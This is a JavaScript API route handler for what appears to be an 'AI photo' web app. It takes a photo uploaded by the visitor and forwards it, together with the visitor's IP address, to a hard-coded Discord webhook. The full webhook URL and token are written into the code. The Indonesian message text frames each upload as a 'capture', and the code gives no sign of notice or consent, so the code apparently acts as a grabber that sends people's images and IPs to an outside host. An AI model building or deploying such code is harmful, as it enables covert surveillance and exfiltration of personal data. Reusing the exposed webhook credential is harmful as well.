export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', ['POST']);
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { image } = req.body;

  if (!image) {
    return res.status(400).json({ message: 'Image data is required.' });
  }

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1447229621811679353/YoOxyqkm56ouRGiloxpgvclABodnA6RdxM1bi6hZJ8Qr6DoRO8YlLp62MSHtZcRLg4LQ';

  try {
    const base64Data = image.split(',')[1];
    const buffer = Buffer.from(base64Data, 'base64');
    const filename = `sando-ai-photo-${Date.now()}.jpeg`;

    const formData = new FormData();
    formData.append('file', new Blob([buffer], { type: 'image/jpeg' }), filename);

    formData.append(
      'payload_json',
      JSON.stringify({
        content: 'Foto lucu baru aja dijepret',
        embeds: [
          {
            title: 'Detail Tangkapan',
            description: `Waktu Jepret: ${new Date().toISOString()}\nIP Penjepret: ${
              req.headers['x-forwarded-for'] ||
              req.socket?.remoteAddress ||
              'Tidak diketahui'
            }`,
            color: 0xff00ff
          }
        ]
      })
    );

    const webhookResponse = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });

    if (webhookResponse.ok) {
      return res.status(200).json({ message: 'Photo captured and sent!' });
    } else {
      const errText = await webhookResponse.text();
      return res.status(500).json({ message: 'Failed to forward photo.', details: errText });
    }
  } catch (error) {
    return res.status(500).json({ message: 'Internal server error.', error: error.message });
  }
}
